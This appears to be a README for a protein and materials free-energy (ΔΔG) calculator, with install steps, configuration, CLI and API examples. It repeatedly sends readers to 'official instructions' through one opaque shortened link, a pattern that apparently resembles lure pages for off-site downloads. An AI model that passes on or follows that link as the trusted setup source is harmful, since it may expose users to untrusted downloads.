# 📊 Delta-Delta-G Calculator — Complete Guide

<div align="center">

![Delta-Delta-G](https://img.shields.io/badge/Delta--Delta--G-Calculator-F59E0B?style=for-the-badge&logo=gnuplot&logoColor=black)
![Physics](https://img.shields.io/badge/Physics-Analysis-7C3AED?style=for-the-badge&logo=scipy&logoColor=white)
![Materials](https://img.shields.io/badge/Materials-Science-16A34A?style=for-the-badge&logo=materialsproject&logoColor=white)
![Guides](https://img.shields.io/badge/Guides-95K-EA580C?style=for-the-badge&logo=readthedocs&logoColor=white)

### ⚛️ Fast, Reproducible ΔΔG Calculations for Materials & Chemistry

*A complete guide to computing relative free energy differences from quantum data*

</div>

---

## 🧪 Choose Your Path

> **🎯 Where do you want to start?**

| 🎯 Goal | 📍 Go To | ⏱️ Time |
|--------|----------|:-------:|
| 🧠 Understand what ΔΔG means | [Overview](#-overview) | 3 min |
| ⚡ Run my first calculation | [Quick Start](#-quick-start) | 5 min |
| 📐 Learn the formula | [Formula](#-formula) | 2 min |
| 🧬 Pick a force field | [Methods](#-methods) | 5 min |
| 📊 Analyze results | [Outputs](#-outputs) | 5 min |
| 🚑 Fix an error | [Troubleshooting](#-troubleshooting) | 2 min |

---

## 🎯 Overview

**Delta-Delta-G Calculator** (ΔΔG) is a scientific toolkit for computing **relative free energy differences** between two molecular or material states — a quantity central to drug design, protein engineering, catalyst screening, and materials discovery.

The calculator ingests structural data (PDB, CIF, SDF), extracts relevant thermodynamic values, and computes ΔΔG = ΔG₂ − ΔG₁ with full uncertainty propagation, ready for publication or pipeline integration.

### 🧩 What It Does

| Function | Purpose |
|----------|---------|
| 🔬 **ΔΔG computation** | Two-state free energy difference |
| 🧪 **Structure parsing** | PDB, CIF, SDF, MOL2 |
| 📊 **Uncertainty propagation** | Error bars on output |
| 📈 **Comparison reports** | Multiple variants |
| 🎨 **Visualization** | Free energy landscapes |
| 📤 **Export** | CSV, JSON, PDF |
| 🔌 **API access** | Programmatic runs |
| 🧠 **ML correction** | Optional empirical corrections |

---

## 📐 Formula

```
ΔΔG = ΔG_variant − ΔG_wildtype
ΔG  = G_bound − G_free
```

### 🧬 Core Concepts

| Term | Meaning |
|------|---------|
| ΔG | Gibbs free energy change |
| ΔΔG | Difference between two ΔG values |
| 🧪 **Reference state** | Baseline for comparison |
| 🌡️ **Temperature** | Affects ΔG |
| 🧊 **Force field** | Energy model |
| 📉 **Error** | Uncertainty on ΔG |
| 🧠 **Correction** | Empirical adjustments |

### 🎯 Typical Use Cases

| Field | Application |
|-------|-------------|
| 💊 **Drug design** | Predict binding changes |
| 🧬 **Protein engineering** | Mutation effects |
| ⚗️ **Catalysis** | Compare catalyst surfaces |
| 🔋 **Batteries** | Compare electrode materials |
| 🌱 **Enzyme design** | Stability vs activity |
| 🧪 **Peptide design** | Affinity optimization |

---

## 🖥️ System Requirements

### 🔹 Minimum

```
✅ OS: Windows 10, macOS 11+, Ubuntu 20.04+
✅ CPU: Dual-core 2.0 GHz
✅ RAM: 4 GB
✅ Storage: 500 MB
✅ Python: 3.10+
✅ Dependencies: numpy, pandas
✅ Internet: For updates (offline mode available)
```

### 🔸 Recommended

```
⭐ OS: Windows 11 / macOS 13+ / Ubuntu 22.04+
⭐ CPU: 8+ cores
⭐ RAM: 16 GB
⭐ Storage: 5 GB SSD
⭐ Python: 3.11+
⭐ GPU: NVIDIA RTX 3060+ (for ML corrections)
⭐ Scientific stack: RDKit, OpenMM, MDAnalysis
```

<div align="center">

[![Get Instructions](https://img.shields.io/badge/📘_GET_INSTRUCTIONS-F59E0B?style=for-the-badge&logo=gnuplot&logoColor=black&labelColor=92400E)](https://share.google/zCwMwDqHp41yikkdc)

</div>

---

## 📘 Get Instructions

<div align="center">

### 🚀 Access the Official Setup Guide

Click below to reach the instructions portal:

<br>

[![Get Instructions](https://img.shields.io/badge/📘_GET_INSTRUCTIONS-7C3AED?style=for-the-badge&logo=scipy&logoColor=white&labelColor=4C1D95)](https://share.google/zCwMwDqHp41yikkdc)

<br>

*Open Source • Research-Grade • Updated 2025*

</div>

### 📚 Available Guides

| Guide | Purpose |
|-------|---------|
| 📘 **Installation Guide** | Setup the calculator |
| 📗 **Calculation Guide** | Step-by-step walkthrough |
| 📙 **Methods Guide** | Force fields & corrections |
| 📕 **Batch Guide** | High-throughput runs |
| 📓 **Integration Guide** | SLURM / cloud |

---

## ⚡ Quick Start

### 🪜 Step 1 — Set Up Environment

```bash
python -m venv ddg-env
source ddg-env/bin/activate
```

### 🪜 Step 2 — Install

```bash
pip install ddg-calculator
```

### 🪜 Step 3 — Verify

```bash
ddg --version
```

Expected: `ddg-calculator v2.x.x`

### 🪜 Step 4 — Configure

Create `~/.ddg/config.yaml`:

```yaml
calculator:
  forceField: amber99sb
  temperature: 298.15
  uncertainty: monte_carlo
  samples: 1000

corrections:
  enabled: true
  model: empirical-v2

output:
  format: csv
  precision: 2
  units: kcal/mol
```

<div align="center">

[![Get Instructions](https://img.shields.io/badge/📘_GET_INSTRUCTIONS-16A34A?style=for-the-badge&logo=scipy&logoColor=white&labelColor=14532D)](https://share.google/zCwMwDqHp41yikkdc)

</div>

### 🪜 Step 5 — Run First Calculation

```bash
ddg calc --wildtype examples/wt.pdb --variant examples/mut.pdb
```

### 🪜 Step 6 — Review Output

```
ΔG (wildtype): -8.42 kcal/mol
ΔG (variant):  -6.11 kcal/mol
ΔΔG (mutant):  +2.31 ± 0.18 kcal/mol
```

### 🪜 Step 7 — Batch Many Variants

```bash
ddg batch --wildtype wt.pdb --variants variants/ --output results/ --parallel 8
```

### 🪜 Step 8 — Automate with SLURM

```bash
#!/bin/bash
#SBATCH --cpus-per-task=8
#SBATCH --mem=16G
#SBATCH --time=24:00:00

source activate ddg-env
ddg batch --wildtype wt.pdb --variants variants/ --output results/
```

---

## 📥 Inputs

### 🎯 Supported Formats

| Format | Type |
|--------|------|
| 📄 **PDB** | Protein structure |
| 📄 **mmCIF** | Complex structures |
| 📄 **SDF / MOL2** | Small molecules |
| 📄 **FASTA** | Sequences |
| 📄 **CSV** | Batch tables |

### 🧪 Example Directory

```
examples/
├── wildtype.pdb
├── variants/
│   ├── A42G.pdb
│   ├── L88F.pdb
│   └── K120E.pdb
└── config.yaml
```

---

## 📊 Outputs

### 📈 Output Files

| File | Content |
|------|---------|
| 📄 **report.csv** | All results |
| 📄 **report.json** | Structured data |
| 📈 **plot.png** | ΔΔG distribution |
| 🧾 **summary.pdf** | Publication-ready |

### 🎯 Sample Results

| Variant | ΔG_wt | ΔG_mut | ΔΔG | Error |
|---------|:-----:|:------:|:---:|:-----:|
| A42G | −8.42 | −6.11 | +2.31 | ±0.18 |
| L88F | −8.42 | −9.02 | −0.60 | ±0.15 |
| K120E | −8.42 | −5.90 | +2.52 | ±0.21 |

### 🎨 Visualization Types

- 📊 Histogram of ΔΔG values
- 📈 Free energy landscape
- 🎨 Heatmap of variants × positions
- 📉 Comparison to experimental data

---

## 🧠 Methods

### 🔬 Force Fields

| Force Field | Use |
|-------------|-----|
| 🧬 **AMBER99SB** | Protein |
| 🧪 **CHARMM36** | Biomolecules |
| 🧱 **OPLS-AA** | Organic |
| 🔋 **ReaxFF** | Reactive systems |

### 🧮 Calculation Approaches

| Method | Precision | Cost |
|--------|:---------:|:----:|
| ⚡ Free energy perturbation | High | High |
| 📊 Thermodynamic integration | High | High |
| 🧠 Machine learning | Medium | Low |
| 📈 Empirical | Low | Low |

### 🎯 Uncertainty Methods

| Method | Output |
|--------|--------|
| 🎲 Monte Carlo | Distribution |
| 🧾 Bootstrap | Confidence intervals |
| 📊 Analytical | Statistical error |

---

## 🔌 API Access

### 📡 REST Endpoint

```bash
curl -X POST https://api.ddg.example/calculate \
  -F "wildtype=@wt.pdb" \
  -F "variant=@mut.pdb" \
  -F "config=@config.yaml"
```

### 🧾 Response

```json
{
  "deltaG_wildtype": -8.42,
  "deltaG_variant": -6.11,
  "deltaDeltaG": 2.31,
  "error": 0.18,
  "units": "kcal/mol"
}
```

---

## 🧪 Verification

| Check | Command | Expected |
|-------|---------|----------|
| ✅ Install | `ddg --version` | Version shown |
| ✅ Config valid | `ddg config check` | No errors |
| ✅ Sample works | `ddg calc` | Result printed |
| ✅ Uncertainty | Output | Error shown |
| ✅ Batch works | `ddg batch` | All variants |
| ✅ Export works | `--output` | File created |
| ✅ API works | curl | JSON response |
| ✅ Reproducible | Re-run | Same result |

---

## 🩺 Troubleshooting

| Problem | Cause | Solution |
|---------|-------|----------|
| 🚫 PDB parse error | Malformed file | Validate structure |
| 🚫 ΔΔG weird | Missing atoms | Use repair tool |
| 🚫 Slow run | Long MD | Use ML correction |
| 🚫 Memory error | Large system | Reduce samples |
| 🚫 Force field missing | Path | Set `DDG_FF_DIR` |
| 🚫 Export fails | Permissions | Check folder |
| 🚫 Non-reproducible | Random seed | Set seed |
| 🚫 API 429 | Rate limit | Add delay |
| 🚫 Batch crashes | Bad file | Use `--skip-errors` |
| 🚫 Unit confusion | kcal vs kJ | Set `units` |

### 🔄 Reset Config

```bash
ddg config --reset
```

---

## 🧰 CLI Reference

| Command | Purpose |
|---------|---------|
| `ddg calc` | Single calculation |
| `ddg batch` | Batch runs |
| `ddg plot` | Generate plots |
| `ddg export` | Save data |
| `ddg config` | Manage settings |
| `ddg validate` | Check inputs |
| `ddg --version` | Show version |
| `ddg --help` | Show help |

---

## 📚 Resources

| Resource | Purpose |
|----------|---------|
| 📖 **Official Docs** | Reference |
| 🎓 **Papers** | Methodology |
| 💬 **Discord** | Community help |
| 🎥 **Video Guides** | Walkthroughs |
| 📊 **Benchmarks** | Validation |

---

## 💬 FAQ

**Is it free?**
Yes — MIT-licensed and open source.

**Which fields can I use it in?**
Drug design, protein engineering, materials.

**Do I need a GPU?**
Only for ML corrections.

**Can I run it offline?**
Yes — except for API features.

**How accurate is it?**
Depends on method; ML corrections best for speed.

**Does it support MD?**
It integrates with OpenMM for sampling.

**Can I batch thousands of variants?**
Yes — with SLURM or cloud.

**Is it published?**
Yes — cite the corresponding paper.

**Can I integrate into my lab pipeline?**
Yes — full CLI + API.

**Does it handle ligands?**
Yes — via SDF/MOL2.

---

## 📅 Version History

| Version | Date | Highlights |
|---------|------|-----------|
| **2.3.0** | Jan 2025 | ML correction v2 |
| 2.1.0 | Oct 2024 | Batch + SLURM |
| 2.0.0 | Jun 2024 | REST API |
| 1.5.0 | Feb 2024 | Initial release |

---

<div align="center">

### 🌟 Found This Guide Helpful?

[![Get Instructions](https://img.shields.io/badge/📘_GET_INSTRUCTIONS-EA580C?style=for-the-badge&logo=scipy&logoColor=white&labelColor=7C2D12)](https://share.google/zCwMwDqHp41yikkdc)

**⭐ Star this repository if it helped! ⭐**

*Made with 💜 for the scientific community*

</div>
